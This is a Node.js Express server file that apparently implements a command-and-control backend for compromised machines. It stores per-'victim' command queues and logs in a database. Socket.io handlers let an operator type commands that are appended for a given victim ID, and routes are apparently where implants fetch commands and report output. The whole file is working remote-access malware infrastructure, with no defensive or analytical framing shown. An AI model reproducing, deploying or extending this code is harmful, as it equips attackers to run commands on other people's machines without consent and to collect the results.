var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var bodyParser = require('body-parser');
var session = require('express-session');
var config = require('config');
var victims_md = require('./models/victims');

var app = express();
var io = require('socket.io').listen(app.listen(3000, function(){
    console.log("Listen on port 3000");
}));
var sockets = [];
io.sockets.on("connection", function(socket){
    console.log("new user connection");

    socket.on("adduser", function(id){
        socket.id = id;
        sockets.push(socket);
        var log = victims_md.getLogByID(id);

        if(log) {
            log.then(function(logs) {
                var log = logs[0].log;
                //console.log(log);
                if (log) {
                    var data = {
                        message: log
                    };
                    socket.emit("update_message", data);
                }
            }).catch(function(err){
                console.log('Can not get log by id');
            });
        }
    });

    //listen send_message
    socket.on("send_message", function(message){
        //add command to database
        var command = victims_md.getCommandByID(socket.id);

        if(command) {
            command.then(function(commands) {
                var command = commands[0].command;
                if (command) {
                    command = command + ";" + message;
                } else {
                    command = message;
                }

                var update = victims_md.updateCommandByID(socket.id, command);
                update.then(function(result) {

                }).catch(function(err) {
                    console.log('Can not update command by id');
                });
            }).catch(function(err) {
                console.log('Can not get command by id');
            });
        }


        //add log to database
        var message_log = "> " + message;
        var log = victims_md.getLogByID(socket.id);

        if(log) {
            log.then(function(logs) {
                var log = logs[0].log;
                if (log) {
                    log = log + "\n" + message_log;
                } else {
                    log = message_log;
                }

                var update = victims_md.updateLogByID(socket.id, log);
                update.then(function (result) {

                }).catch(function (err) {
                    console.log('Can not update log by id');
                });
            }).catch(function (err) {
                console.log('Can not get log by id');
            });
        }

        //notify meself
        var data = {
            message: message_log
        };

        socket.emit("update_message", data);
    });
});

var indexRouter = require('./routes/index');
var adminRouter = require('./routes/admin');
var requestRouter = require('./routes/request');
var responseRouter = require('./routes/response')(sockets);


// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

//body-parser
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({extended: true}));

//session
app.set('trust proxy', 1);
app.use(session({
    secret: config.get('secret_key'),
    resave: false,
    saveUninitialized: true,
    cookie: {secure: true}
}));

//Static Folder
app.use('/static', express.static(__dirname + '/public'));

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/admin', adminRouter);
app.use('/request', requestRouter);
app.use('/response', responseRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
